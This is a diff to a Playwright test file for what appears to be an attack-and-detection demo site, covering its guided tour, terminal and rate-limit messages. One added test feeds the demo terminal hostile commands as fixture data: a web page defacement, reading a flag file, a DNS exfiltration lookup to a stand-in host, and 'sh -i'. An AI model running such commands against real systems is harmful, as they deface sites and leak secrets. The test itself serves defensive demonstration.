@@ -542,6 +542,46 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     expect(problems).toEqual([]);
   });
 
+  test("step 5 pressed after the tour's terminal session: the button says Starting… at once, then the API's wait after a terminal run with its countdown, in the rail of both views", { tag: "@default" }, async ({ page, isMobile }) => {
+    test.setTimeout(90_000);
+    const problems = guardConsole(page);
+    // The mock waits after a terminal run as the API does (ADR 0015 amendment 2026-10-13).
+    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=3000&mock-terminal-wait=1");
+    const steps = page.locator("#tour-steps");
+    const term = page.locator("#terminal");
+    const input = term.locator("#term-input");
+    if (isMobile) await page.locator("#tour .tour").getByRole("button", { name: "Show the steps" }).click();
+    await term.getByRole("button", { name: /Open the terminal/ }).click();
+    for (const cmd of ["id", "echo pwned>/srv/shop/index.html;echo '{\"status\":\"defaced\"}'>/srv/shop/state.json", "cat /srv/shop/.flag", "nslookup sdp-<flag>.x.exfil.sdp.test.", "sh -i"]) {
+      await expect(term.locator(".term__send")).toBeEnabled({ timeout: 10_000 });
+      await input.fill(cmd);
+      await input.press("Enter");
+    }
+    await expect(steps.locator('.tour__step[data-id="caught"]')).toHaveAttribute("data-done", "true", { timeout: 15_000 });
+    const five = steps.locator('.tour__step[data-id="compare"]');
+    const launch = five.locator(".tour__btn[data-scenario]");
+    await expect.poll(() => launch.getAttribute("aria-disabled"), { timeout: 15_000 }).toBe("false");
+    // The mock's request answers in ~30 ms: slow it so the pressed state can be seen.
+    await page.evaluate(() => {
+      const f = window.fetch;
+      window.fetch = (input, init) => (String(input).includes("/api/attack/") ? new Promise((r) => setTimeout(r, 600)).then(() => f(input, init)) : f(input, init));
+    });
+    await launch.click();
+    await expect(launch).toHaveText("Starting…", { timeout: 300 });
+    await expect(launch).toHaveAttribute("aria-busy", "true");
+    const line = five.locator(".tour__launch");
+    await expect(line).toContainText("After a terminal session the next run waits as long as the session held the cluster (yours: ", { timeout: 10_000 });
+    await expect(line).not.toContainText("a few attacks per 10 minutes");
+    await expect(line.locator(".tour__launchcount")).toContainText(/Unlocks in \d+(:\d\d| s)/);
+    await expect(launch).toHaveText("Launch side by side");
+    await expect(launch).toHaveAttribute("aria-disabled", "true");
+    await expect(launch).not.toHaveAttribute("aria-busy", "true");
+    // Technical Mode keeps the line in the rail: the launcher's own is far below it.
+    await page.locator("#tech-toggle").click();
+    await expect(line).toBeVisible();
+    expect(problems).toEqual([]);
+  });
+
   test("a step's chip pressed while the last command's 202 is still in flight says so, fills in once that command is done, and Enter runs it", { tag: "@default" }, async ({ page, isMobile }) => {
     // The command's end can reach the page before its 202 does (the stream beats the POST): the tour
     // moves on, and its next chip is pressed while the terminal still holds the one-command lock.
@@ -1048,11 +1088,12 @@ test.describe("mock mode", () => {
     await expect(page.locator(".run").first().locator(".chip--state")).toHaveText("Finished");
     await expect(button).toHaveAttribute("aria-disabled", "false");
     await button.click();
-    await expect(page.locator("#launch-status")).toContainText("Rate limit reached");
     await expect(button).toHaveAttribute("aria-disabled", "true");
     await expect(button).toContainText("Rate limited");
-    // The copy explains the limit is per network address, and the countdown lives in the same line.
-    await expect(page.locator("#launch-status")).toContainText("per network address");
+    // The copy names the limit /api/limits says is used up (the API's 429 says only "attack rate limit
+    // reached"), and the countdown from Retry-After lives in the same line.
+    await expect(page.locator("#launch-status")).toContainText("Your network address can start no run right now: 1 per 10 min");
+    await expect(page.locator("#launch-status")).not.toContainText("a few attacks per 10 minutes");
     await expect(page.locator("#launch-status .launch-status__countdown")).toContainText(/Unlocks in \d+:\d\d/);
     expect(problems).toEqual([]);
   });
